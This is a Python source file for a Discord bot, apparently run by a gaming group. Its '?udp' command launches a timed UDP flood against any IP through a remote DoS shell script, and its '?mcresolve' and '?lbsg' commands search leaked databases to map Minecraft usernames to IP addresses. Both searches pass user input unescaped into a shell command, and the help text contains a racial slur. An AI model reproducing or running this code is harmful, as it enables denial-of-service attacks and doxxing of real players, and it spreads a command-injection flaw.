import discord
import json
import requests
import os
import sys
from discord.ext.commands import Bot
from discord.ext import commands

Client = discord.Client()
bot_prefix = "?"
client = commands.Bot(command_prefix=bot_prefix)

@client.event
async def on_ready():
	print("Bot Online!")
	print("Name: {}".format(client.user.name))
	print("ID: {}".format(client.user.id))
	await client.change_presence(game=discord.Game(name='?commands for help'))

#Variables
TOKEN = "" #Paste token here
authUsers = ['Noodles#8431', 'Cringeson#9529', '_xEverettx_#7806']


#Help Menu (?help)
@client.command(pass_context=True)
async def commands(ctx):
	await client.say(
"""Welcome to ZoodleC0rpz Official Discord Bot
?commands - dank shIet nigga
?mcresolve - (?mcresolve <IGN>) Resolve ip of username
?oldnames - (?oldnames <IGN>) Looks up old names of username
?udp - (?udp <IP> <TIME> <PORT>) Denial of Service attack using layer 4
?bark - Like ping but better
?daddy - Who's your daddy o.0
""")

#Discord Tag
@client.command(pass_context=True)
async def tester(ctx):
	messageAuthor = str(ctx.message.author)
	if messageAuthor in authUsers:
		await client.say("Is Authorized")
	else:
		await client.say("Not Authorized")

#lifeboat sg search
@client.command(pass_context=True)
async def lbsg(ctx, query):
	results = os.popen("grep -w \"" + query +"\" /media/danesh/External/sketch/DATABASES/db.txt").read()
	await client.say(results)
#Minecraft Resolver
@client.command(pass_context=True)
async def mcresolve(ctx, mcign):
	dboutput = os.popen("grep -w \"" + mcign + "\" kobirocks.txt").read()
	if dboutput.count("\n") > 0:
		await client.say(dboutput)
	else:
		await client.say("No Results Found! Try Resolving old names.")

#Minecraft Name History (?oldnames <username>)
@client.command(pass_context=True)
async def oldnames(ctx, username):
	url = "https://api.mojang.com/users/profiles/minecraft/" + username
	r = requests.get(url)
	uuid = r.json()['id']
	
	url2 = "https://api.mojang.com/user/profiles/" + uuid + "/names"
	r2 = requests.get(url2)
	numNames = len(r2.json())
	names = ""
	while(numNames > 0):
       		names += (r2.json()[numNames - 1]['name']) + "\n"
        	numNames -= 1
	await client.say(names)

#Sends UDP Flood (?udp <IP> <TIME(SEC)>)
@client.command(pass_context=True)
async def udp(ctx, ip, time):
	messageAuthor = str(ctx.message.author)
	if messageAuthor in authUsers:
		if(int(time) > 60):
			await client.say("You can only toast for 60 seconds!")
		else:
			await client.say("Attempting to toast " + ip + " for " + time + " seconds!")
			url = "http://YOURSHELLIP/dos.php?host=" + ip + "&time=" + time + "&type=UDP"
			requests.get(url)
			await client.say("Successfully toasted " + ip + "'s router")
	else:
		await client.say("You're not sexy enough, contact Noodles#8431 for perms")
#Resolve IP (?resolve <ip>)
@client.command(pass_context=True)
async def resolve(ctx, ip):
	url = 'http://ip-api.com/json/' + ip
	r = requests.get(url)
	await client.say("\n" + "IP: " + r.json()['query'] + "\n" + "Country: " + r.json()['country'] + " (" + r.json()['countryCode'] + ")" + "\n" + "Region/State: " + r.json()['regionName'] + " (" + r.json()['region'] + ")" + "\n" + "City: " + r.json()['city'] + "\n" + "Lat: " + str(r.json()['lat']) + "\n" + " Long: " + str(r.json()['lon']) + "\n" + "ISP: " + r.json()['isp'] + "\n" + "AS number/name: " + r.json()['as'])

#Replys "Doggo does a bark"
@client.command(pass_context=True)
async def bark(ctx):
	await client.say("Doggo does a bark!")

#Replys the author of this discord bot
@client.command(pass_context=True)
async def daddy(ctx):
	await client.say("Papi Noodles")


client.run(TOKEN)
